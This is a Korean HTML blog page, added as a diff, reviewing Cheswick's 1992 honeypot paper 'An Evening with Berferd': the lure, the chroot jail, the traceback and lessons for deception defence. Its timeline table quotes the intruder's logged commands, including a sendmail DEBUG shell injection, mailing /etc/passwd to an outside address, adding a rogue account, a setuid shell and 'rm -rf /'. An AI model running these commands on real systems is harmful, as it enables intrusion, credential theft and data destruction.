@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🏛️ [클래식] An Evening with Berferd (USENIX Winter 1992) — '가짜 비밀번호 파일을 보내줬다': 1991년 크래커를 chroot 감옥에 가두고 4개월간 관찰한 최초의 허니팟</title>
+    <style>
+        :root {
+            --bg-color: #0f172a;
+            --text-color: #f8fafc;
+            --accent-color: #38bdf8;
+            --secondary-color: #1e293b;
+            --card-bg: #1e293b;
+            --border-color: #334155;
+            --muted-text: #94a3b8;
+        }
+        body {
+            font-family: 'Inter', -apple-system, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            margin: 0;
+            padding: 40px 20px;
+        }
+        .container { max-width: 800px; margin: 0 auto; }
+        header { margin-bottom: 40px; border-bottom: 1px solid var(--border-color); padding-bottom: 20px; }
+        h1 { color: var(--accent-color); font-size: 2rem; }
+        .date { color: var(--muted-text); font-size: 0.9rem; }
+        .content { background: var(--card-bg); padding: 30px; border-radius: 12px; border: 1px solid var(--border-color); }
+        h2 { border-left: 4px solid var(--accent-color); padding-left: 15px; margin-top: 30px; font-size: 1.5rem; }
+        .paper-info { background-color: var(--secondary-color); padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px dashed var(--border-color); }
+        ul { padding-left: 20px; }
+        li { margin-bottom: 15px; }
+        a { color: var(--accent-color); text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        .back-link { display: inline-block; margin-top: 40px; color: var(--muted-text); }
+        blockquote { border-left: 3px solid var(--accent-color); margin: 15px 0; padding: 8px 16px; background: var(--secondary-color); color: var(--muted-text); font-style: italic; }
+        table { width: 100%; border-collapse: collapse; margin: 15px 0; font-size: 0.9rem; }
+        th, td { border: 1px solid var(--border-color); padding: 6px 10px; text-align: left; }
+        th { background: var(--secondary-color); color: var(--accent-color); }
+        code { background: var(--secondary-color); padding: 1px 5px; border-radius: 4px; font-size: 0.85em; }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🏛️ [클래식] An Evening with Berferd — 가짜 비밀번호 파일 한 통에서 시작된 4개월의 관찰</h1>
+            <div class="date"><i class="fa-regular fa-calendar"></i> 2026-11-02 · 카테고리: Research (클래식 논문 · 허니팟/기만 · 침입 추적 · 사고 대응)</div>
+        </header>
+
+        <div class="content">
+            <h2><i class="fa-solid fa-book"></i> 논문 정보</h2>
+            <div class="paper-info">
+                <strong>제목:</strong> An Evening with Berferd, In Which a Cracker is Lured, Endured, and Studied<br>
+                <strong>저자:</strong> Bill Cheswick (William R. Cheswick) — AT&amp;T Bell Laboratories, Computer Science Research<br>
+                <strong>출처:</strong> <em>USENIX Winter 1992 Technical Conference</em> (샌프란시스코, 1992년 1월 발표 · 원고 1991년) · 8페이지<br>
+                <strong>분야:</strong> 침입 탐지 · 허니팟(honeypot)/기만(deception) · 사고 대응 · 유닉스 시스템 보안 · 추적(traceback)<br>
+                <strong>키워드:</strong> Honeypot · chroot Jail · sendmail DEBUG · Intrusion Detection · Traceback · Incident Response<br>
+                <strong>인용:</strong> 165회 (OpenAlex 조회 · 1991년 레코드 기준) — 허니팟·기만 연구의 원점으로 인용되는 고전<br>
+                <strong>원문:</strong> <a href="https://web.archive.org/web/2019/https://www.cheswick.com/ches/papers/berferd.pdf" target="_blank" rel="noopener">PDF (Wayback 보존본)</a>
+            </div>
+
+            <h2><i class="fa-solid fa-question"></i> 왜 이 논문인가 — '막는 것'보다 '보는 것'이 먼저였던 시절</h2>
+            <p>1991년, 방화벽이라는 단어조차 대중적이지 않던 때입니다. AT&amp;T 벨 연구소의 보안 담당자였던 빌 체스윅(Bill Cheswick)은 인터넷 게이트웨이에 성문을 세워놓고 이상한 질문을 붙듭니다. <strong>"자물쇠는 얼마나 자주 딸깍거리는가?"</strong> 누가, 어디서, 어떤 구멍으로 들어오려 하는지 알고 싶었습니다.</p>
+            <p>그래서 그는 가짜 서비스들을 심고, 로그를 매일 훑는 스크립트를 씁니다. FTP에서 <code>/etc/passwd</code>를 가져가면 <em>일부러 가짜 패스워드 파일</em>을 갖다 놓았고, 그 안의 패스워드를 크래킹하면 <code>why are you wasting your time</code>이라는 문장이 나오게 해뒀습니다. 이 논문은 그 미끼가 실제로 물었을 때 벌어진 일 — <strong>4개월에 걸친 관찰과 추적</strong> — 의 기록입니다.</p>
+            <p>오늘날의 허니팟·카나리토큰·기만 방어(MITRE Engage)·EDR 행위 수집은 모두 이 질문의 후손입니다. 그리고 이 논문은 그 계보의 첫 번째 1차 문헌입니다.</p>
+
+            <h2><i class="fa-solid fa-timeline"></i> 사건의 흐름 — 1991년 1월, 걸프전이 터지던 밤</h2>
+            <p>초록은 1991년 1월 7일의 첫 시도를 기록합니다. 크래커는 "유명한 sendmail DEBUG 구멍을 발견했다"고 믿고 패스워드 파일을 요구했고, 체스윅은 <strong>실제로 하나 보내줍니다</strong>. 본문의 로그는 1월 15일 밤의 세션을 자세히 보여줍니다.</p>
+            <table>
+                <tr><th>시각 (1991)</th><th>무슨 일이</th></tr>
+                <tr><td>1/15 19:43</td><td>SMTP 세션에서 <code>debug</code> 명령 시도 → <code>250 OK</code>. 이어 <code>rcpt to:&lt;|sed -e '1,/^$/'d | /bin/sh ; exit 0"&gt;</code> — 메일 본문을 <strong>root 권한 셸</strong>로 실행시키는 고전적 sendmail DEBUG 익스플로잇</td></tr>
+                <tr><td>1/15 19:45</td><td><code>mail adrian@embezzle.stanford.edu &lt;/etc/passwd</code> — 걸프전 공습 보도가 나간 지 30분 뒤. 발신지는 스탠포드의 <em>도난당한</em> 계정 <code>adrian</code></td></tr>
+                <tr><td>1/20 (일)</td><td>프랑스의 한 관리자가 "당신네 root가 보낸 passwd 파일을 침입자가 남기고 갔다"고 메일. 가짜 파일이 <strong>프랑스까지 여행</strong> — 메일러가 패스워드 줄을 RFC 822 헤더로 오해해 대문자화·공백 삽입까지 해둔 상태였다</td></tr>
+                <tr><td>1/20 22:33</td><td><code>finger attempt on berferd</code> — 체스윅이 <em>본인 터미널</em>에서 침입을 목격한 시각. CNN 중계를 보다가 화면이 끊긴 순간</td></tr>
+                <tr><td>1/20 22:36</td><td><code>echo "beferdd::300:1:..." &gt;&gt;/etc/passwd</code> + <code>cp /bin/sh /tmp/shell; chmod 4755 /tmp/shell</code> — 계정 생성과 setuid 셸 시도</td></tr>
+                <tr><td>1/21 01:55</td><td><code>rm -rf /&amp;</code> — "WHOA! 이제 개인적인 문제가 됐다"</td></tr>
+                <tr><td>1/21 07:19~07:23</td><td><code>rm -rf /&amp;</code> 3회 더. 체스윅은 기계를 잠깐 내리고 <code>/etc/motd</code>에 "디스크 고장" 메시지를 남겨 <em>지워진 척</em> 연출</td></tr>
+            </table>
+            <p>이름 <strong>berferd</strong>는 딕 밴 다이크 쇼에서 나온 별명에서 가져왔습니다("Berferd" — '그렇게 생겼으니까'). 크래커가 하필 그 계정을 노리자 논문 제목이 되었습니다.</p>
+
+            <h2><i class="fa-solid fa-masks-theater"></i> 손으로 운영체제를 연기하다 — '7개의 결정'</h2>
+            <p>정공법은 계정을 하나 만들어주는 것이지만, 체스윅은 거부합니다. "로그인을 주면 키스트로크 로그를 얻지 못하고, 나중에 뒷정리만 하게 된다." 대신 그는 <strong>사람이 직접 유닉스를 연기</strong>하기로 합니다. 일관성을 유지하기 위해 내린 것이 이 논문의 유명한 '결정(Decision)' 목록입니다.</p>
+            <ul>
+                <li><strong>결정 1</strong> — FTP에 있던 패스워드 파일은 진짜다. (이미 보내줬으므로 물릴 수 없음)</li>
+                <li><strong>결정 2</strong> — 게이트웨이는 관리가 엉망이다. (DEBUG 구멍이 열려 있고, FTP 디렉터리에 passwd가 있다는 것 자체가 증거)</li>
+                <li><strong>결정 3</strong> — 기계가 굉장히 느리다. 메일이 밤새 안 올 수도 있다. (연기를 위한 완벽한 알리바이)</li>
+                <li><strong>결정 4</strong> — 셸은 <code>/bin</code>에 없다. (<code>/bin/sh</code>를 복사하려는 시도가 전부 "실패"하게 만들기)</li>
+                <li><strong>결정 5</strong> — <code>talk</code> 명령은 없다.</li>
+                <li><strong>결정 6</strong> — DEBUG 구멍 사용 시 오류는 침입자에게 보이지 않는다. 오류가 나면 이후 명령은 실행되지 않는다.</li>
+                <li><strong>결정 7</strong> — 이 컴퓨터는 결정론적이지 않다. (같은 명령이 어떤 날은 되고 어떤 날은 안 됨 — <code>inetd.conf</code>·<code>ps</code> 요구를 계속 회피하기 위한 설정)</li>
+            </ul>
+            <p>결과는 희극에 가깝습니다. 크래커는 계정 이름을 <code>b</code> → <code>beferdd</code> → <code>bferd</code> → <code>bfrd</code> → <code>bffr</code>로 계속 바꿔가며 시도했고, <code>fingerd</code>를 <code>/bin/sh</code>로 바꿨다가 실패하자 <em>직접 원상복구</em>까지 합니다("친절하게도 Berferd가 치워줬다"). <code>passwd</code>로 비밀번호를 바꾸려 한 시도는 애초에 성공할 수 없었습니다 — <code>passwd</code>는 셸 스크립트가 아니라 <code>/dev/tty</code>에서 입력을 읽기 때문입니다.</p>
+            <blockquote>"나는 그가 들어오려고 쓰는 시간보다, 그를 끌고 다니는 내 시간이 더 길었으면 좋겠다고 생각했다. 장기적으로는 그가 이 싸움에서 이겼다."</blockquote>
+
+            <h2><i class="fa-solid fa-door-closed"></i> 감옥(The Jail) — chroot로 만든 관찰 실험실</h2>
+            <p>수기 시뮬레이션은 확장성이 없습니다. 그래서 등장한 것이 <strong>chroot "감옥"</strong>입니다. 지역 전문가들의 조언은 정직했습니다. "완벽히 안전하지는 않다. 다만 컴파일러와 몇몇 프로그램이 없으면 탈출은 매우 어렵다. 들킬 수도 있지만, Berferd는 늘 급하다."</p>
+            <ul>
+                <li><strong>구성</strong> — <code>/usr/spool/hacker</code>를 루트로 하는 chroot. 로그인을 흉내내는 <code>setupsucker</code> 스크립트, 연결을 받아내는 <code>callsucker</code>, 로그를 모으는 <code>ldcon</code>. 세션마다 <em>입력 로그와 출력 로그를 따로</em> 남겼습니다.</li>
+                <li><strong>디테일</strong> — <code>/dev</code>의 접근 시간(atime)을 맞추고, 감옥 사용자용 <code>utmp</code> 항목을 직접 조작하고, 위험한 raw 디스크 파일을 제거. <code>ps</code>·<code>who</code>·<code>w</code>·<code>netstat</code> 같은 "말이 많은" 프로그램은 아예 삭제.</li>
+                <li><strong>미끼</strong> — 다이애나 디안젤로가 그럴듯한 파일 시스템을 구축하고, 우스꽝스럽고 탐나는 파일들을 잔뜩 깔아둠.</li>
+                <li><strong>결과</strong> — Berferd는 감옥을 발견하고 한참을 뒤졌습니다. 자신이 좋아하는 구멍이 있는 프로그램들을 찾아다녔지만, 감옥에는 없었습니다. 그는 그냥 "이 게이트웨이는 원래 이상한 곳" 정도로 넘겼습니다.</li>
+            </ul>
+            <p>체스윅 본인의 평가는 냉정합니다. <strong>"감옥은 흥미로운 교육이었지만, 그만한 가치가 없었다. 맞추기 너무 어렵고, 결코 완전히 안전하지 않다."</strong> 대안으로 그가 제시한 구조가 오늘날 허니팟 아키텍처의 원형입니다 — <em>버려도 되는(throwaway) 취약한 기계</em> 하나, 그리고 같은 이더넷에서 바이트를 캡처하는 <em>감시 기계</em> 하나. 그 감시 기계조차 "의심스러운 패킷이 새어나가지 않도록 트랜시버 케이블의 송신선을 잘라두었다"는 대목이 인상적입니다.</p>
+
+            <h2><i class="fa-solid fa-route"></i> 추적 — 스탠포드에서 네덜란드까지, 그리고 법의 벽</h2>
+            <p>공격은 스탠포드의 여러 기계를 경유했습니다. 스탠포드의 스티븐 한센은 Gandalf 스위치에 물린 터미널 서버까지 추적했지만, 그 너머는 전화선이었습니다. 로스앨러모스의 <strong>쓰토무 시모무라</strong>는 <code>tcpdump</code>를 개조해 타임스탬프가 찍힌 패킷 기록을 만들었고, 이것으로 실시간 터미널 세션을 재생할 수 있었습니다. (그가 4년 뒤 케빈 미트닉 추적의 주인공이 된다는 점을 떠올리면 이 각주는 상당히 묘합니다.)</p>
+            <p>추적은 네덜란드에서 막힙니다. <strong>네덜란드 전화회사는 발신자까지 추적을 이어가기를 거부</strong>했습니다. 이유는 두 가지 — 당시 네덜란드에서 해킹은 불법이 아니었고, 범죄인인도 조약도 없었습니다. 조약을 만들려면 행정부 조치와 미국 상원의 승인이 필요했습니다. 추적이 국경을 넘는 순간 기술 문제가 아니라 <em>외교 문제</em>가 된다는 것.</p>
+            <p>결국 1월에 에인트호번 공과대학의 <strong>비체 베네마(Wietse Venema)</strong>가 접촉해 해커 그룹을 추적했고, Berferd의 이름·주소·전화번호까지 특정합니다. 1991년 4월 21일 <em>뉴욕타임스</em>의 존 마코프가 사건을 보도했고, 5월 3일 관리 요청으로 감옥은 문을 닫습니다. 마지막 목격은 스웨덴의 한 컴퓨터에서였다고 합니다. 감옥에서 그가 공격한 100여 개 사이트 중 <strong>자신이 공격당한 사실을 알아챈 곳은 세 곳뿐</strong>이었습니다.</p>
+
+            <h2><i class="fa-solid fa-lightbulb"></i> 저자가 남긴 결론 — 35년이 지나도 유효한 네 문장</h2>
+            <ul>
+                <li><strong>"해커가 로그인 하나를 얻으면, 언젠가 root가 될 가능성이 높다."</strong> 논문이 꼽은 가장 중요한 교훈입니다. 높은 권한으로 도는 버그투성이 프로그램이 너무 많다는 것. 2026년의 관점에서도 이 문장은 그대로 유효합니다 — 초기 침해(initial access) 이후 권한 상승은 <em>시간 문제</em>이지 <em>가능성 문제</em>가 아닙니다.</li>
+                <li><strong>"감옥은 그만한 가치가 없었다."</strong> 손으로 만든 기만은 유지비가 너무 크고, 완전한 격리를 보장하지 못합니다. 진짜 자산은 <em>관찰 데이터</em>이며, 그 데이터를 얻는 가장 싼 방법은 진짜 취약한 기계 + 조용한 캡처입니다.</li>
+                <li><strong>"침입에는 좋은 구멍 목록과 엄청난 끈기가 필요하다."</strong> Berferd가 가진 것은 제로데이가 아니라 <em>잘 정리된 취약점 목록</em>과 집요함이었습니다. 오늘날 침해 사고의 다수가 알려진 취약점의 미패치에서 시작된다는 통계와 정확히 같은 이야기입니다.</li>
+                <li><strong>"통제 밖으로 나가면 추적은 어렵다."</strong> 여러 통신사업자, 수사기관, 때로는 상원까지 개입해야 합니다.</li>
+            </ul>
+
+            <h2><i class="fa-solid fa-clock-rotate-left"></i> 오늘의 관점 — 이 논문이 남긴 것과 남기지 못한 것</h2>
+            <ul>
+                <li><strong>계보:</strong> 이 논문 이후 허니팟은 산업이 되었습니다. Honeyd(2003) → 허니팟 네트워크·T-Pot → MITRE Engage의 기만 기법 분류 → 오늘날의 카나리토큰·디셉션 플랫폼까지, "피해 없이 공격자 행위를 관찰한다"는 원칙은 그대로입니다. 한편 체스윅은 스티브 벨로빈과 함께 <em>Firewalls and Internet Security</em>(1994)를 써서 방화벽 시대의 교과서를 만들었습니다 — 이 논문에 등장하는 "벨로빈이 미끼 기계를 하나 만들었지만 아무도 끌어들이지 못했다"는 대목이 그 인연의 예고편입니다.</li>
+                <li><strong>기술적 한계:</strong> chroot는 오늘날 격리 수단으로 부적절합니다. 루트 권한을 가정한 탈출 기법이 수도 없이 알려져 있고, 컨테이너조차 커널 공유라는 본질적 약점을 안고 있습니다. 지금 같은 실험을 한다면 VM·마이크로VM·네트워크 세그멘테이션이 최소 단위일 것입니다.</li>
+                <li><strong>법적 환경의 변화:</strong> 1991년 네덜란드에서는 해킹이 합법이었습니다. 지금은 대부분의 국가에 컴퓨터범죄 조항과 국제 공조 체계(부다페스트 협약)가 있습니다. 반대로 <em>허니팟 운영 자체</em>가 유인·감청 논란을 부를 수 있다는 새로운 법적 질문이 생겼습니다.</li>
+                <li><strong>그래도 남는 것:</strong> 이 논문의 진짜 기여는 기술이 아니라 <em>태도</em>입니다. 사고를 "막았/뚫렸"의 이분법으로 기록하지 않고, 공격자의 <strong>행동 시퀀스와 도구 목록을 데이터로 남긴 것</strong>. MITRE ATT&amp;CK, EDR 텔레메트리, 위협 인텔리전스는 모두 이 태도의 후예입니다.</li>
+            </ul>
+            <p>덧붙여, 이 논문은 <em>공격자 추적</em>을 다루지만 교육적 목적의 관찰 기록이라는 점이 중요합니다. 실제 운영 환경에서 유인·감시를 설계할 때는 법률 검토와 개인정보·감청 규정을 먼저 확인해야 하며, 이 글의 사례를 그대로 모방하는 것은 권장되지 않습니다.</p>
+
+            <h2><i class="fa-solid fa-link"></i> 출처</h2>
+            <ul>
+                <li>원문: <a href="https://web.archive.org/web/2019/https://www.cheswick.com/ches/papers/berferd.pdf" target="_blank" rel="noopener">An Evening with Berferd — In Which a Cracker is Lured, Endured, and Studied (PDF, Wayback 보존본)</a> — 원 사이트(cheswick.com)는 현재 접속 불가</li>
+                <li>발표: USENIX Winter 1992 Technical Conference, San Francisco (1992년 1월)</li>
+                <li>인용 수: <a href="https://api.openalex.org/works?search=An%20Evening%20with%20Berferd" target="_blank" rel="noopener">OpenAlex</a> 기준 165회 (2026-11-02 조회)</li>
+                <li>함께 읽기: Stoll, C., <em>The Cuckoo's Egg</em> (1990) — 논문이 직접 참조한, 추적 서사의 원형</li>
+            </ul>
+        </div>
+
+        <a href="index.html" class="back-link"><i class="fa-solid fa-arrow-left"></i> 목록으로 돌아가기</a>
+    </div>
+</body>
+</html>
